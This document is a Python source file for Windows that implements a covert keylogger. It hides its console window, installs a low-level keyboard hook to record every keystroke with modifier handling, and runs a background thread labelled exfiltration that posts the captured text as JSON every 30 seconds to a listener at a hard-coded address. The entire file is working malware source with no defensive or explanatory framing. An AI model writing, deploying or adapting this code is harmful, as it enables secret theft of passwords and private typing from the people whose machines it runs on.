import ctypes
import ctypes.wintypes
import sys
import json
import threading
import time
import urllib.request

LISTENER = "http://10.10.10.5:8080"
INTERVAL = 30

# ── low-level console control (suppress window, detach from console) ──
kernel32 = ctypes.windll.kernel32
kernel32.AllocConsole.restype = ctypes.wintypes.BOOL
kernel32.FreeConsole.restype = ctypes.wintypes.BOOL
kernel32.GetConsoleWindow.restype = ctypes.wintypes.HWND
user32 = ctypes.windll.user32
SW_HIDE = 0
user32.ShowWindow.argtypes = [ctypes.wintypes.HWND, ctypes.c_int]
kernel32.FreeConsole()
hwnd = kernel32.GetConsoleWindow()
if hwnd:
    user32.ShowWindow(hwnd, SW_HIDE)

# ── virtual-key → readable string ──
VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_MENU = 0x12  # Alt
VK_CAPITAL = 0x14
VK_RETURN = 0x0D
VK_BACK = 0x08
VK_TAB = 0x09
VK_ESCAPE = 0x1B
VK_SPACE = 0x20
VK_DELETE = 0x2E
VK_LEFT = 0x25
VK_UP = 0x26
VK_RIGHT = 0x27
VK_DOWN = 0x28
VK_LWIN = 0x5B
VK_RWIN = 0x5C

NAMED = {
    VK_RETURN: "[ENTER]",
    VK_BACK: "[BKSP]",
    VK_TAB: "[TAB]",
    VK_ESCAPE: "[ESC]",
    VK_SPACE: " ",
    VK_DELETE: "[DEL]",
    VK_LEFT: "[LEFT]",
    VK_UP: "[UP]",
    VK_RIGHT: "[RIGHT]",
    VK_DOWN: "[DOWN]",
    VK_LWIN: "[LWIN]",
    VK_RWIN: "[RWIN]",
}

shift_map = str.maketrans(
    "`1234567890-=[]\\;',./",
    "~!@#$%^&*()_+{}|:\"<>?",
)

caps_on = False
shift_down = False
ctrl_down = False
alt_down = False
buf = []


def vk_to_char(vk, scancode):
    global caps_on, shift_down, ctrl_down, alt_down

    if vk == VK_CAPITAL:
        caps_on = not caps_on
        return None
    if vk == VK_SHIFT:
        shift_down = True
        return None
    if vk == VK_CONTROL:
        ctrl_down = True
        return None
    if vk == VK_MENU:
        alt_down = True
        return None

    named = NAMED.get(vk)
    if named is not None:
        return named

    # modifiers
    mods = []
    if ctrl_down:
        mods.append("CTRL")
    if alt_down:
        mods.append("ALT")
    if mods:
        return "[%s+%s]" % ("+".join(mods), chr(vk) if 0x20 <= vk < 0x7F else "VK%02X" % vk)

    # printable
    if 0x20 <= vk < 0x7F:
        c = chr(vk)
        if shift_down:
            c = c.translate(shift_map) if c in "`1234567890-=[]\\;',./" else c.upper()
        elif caps_on and "a" <= c <= "z":
            c = c.upper()
        else:
            c = c.lower()
        return c

    return None


def buf_key_up(vk):
    global shift_down, ctrl_down, alt_down
    if vk == VK_SHIFT:
        shift_down = False
    if vk == VK_CONTROL:
        ctrl_down = False
    if vk == VK_MENU:
        alt_down = False


# ── low-level keyboard hook ──
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
WM_SYSKEYDOWN = 0x0104
WM_SYSKEYUP = 0x0105

hook_proc = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.restype = ctypes.c_void_p
CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.restype = ctypes.c_long
UnhookWindowsHookEx = user32.UnhookWindowsHookEx
GetMessageA = user32.GetMessageA
GetMessageA.restype = ctypes.wintypes.BOOL


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_ulong),
    ]


hook_ref = None


def hook_cb(code, wParam, lParam):
    global buf
    if code >= 0:
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk = kb.vkCode
        if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            ch = vk_to_char(vk, kb.scanCode)
            if ch:
                buf.append(ch)
        elif wParam in (WM_KEYUP, WM_SYSKEYUP):
            buf_key_up(vk)
    return CallNextHookEx(None, code, wParam, lParam)


hook_ref = hook_proc(hook_cb)

# ── exfiltration thread ──
def exfil():
    global buf
    while True:
        time.sleep(INTERVAL)
        if not buf:
            continue
        snapshot = "".join(buf)
        buf.clear()
        try:
            data = json.dumps({"log": snapshot}).encode("utf-8")
            req = urllib.request.Request(
                LISTENER,
                data=data,
                headers={"Content-Type": "application/json"},
            )
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            buf.insert(0, snapshot)  # re-queue on failure


threading.Thread(target=exfil, daemon=True).start()

# ── install hook, pump messages ──
hook_id = SetWindowsHookExA(WH_KEYBOARD_LL, hook_ref, kernel32.GetModuleHandleW(None), 0)
if not hook_id:
    sys.exit(1)

msg = ctypes.wintypes.MSG()
try:
    while GetMessageA(ctypes.byref(msg), None, 0, 0):
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageA(ctypes.byref(msg))
finally:
    UnhookWindowsHookEx(hook_id)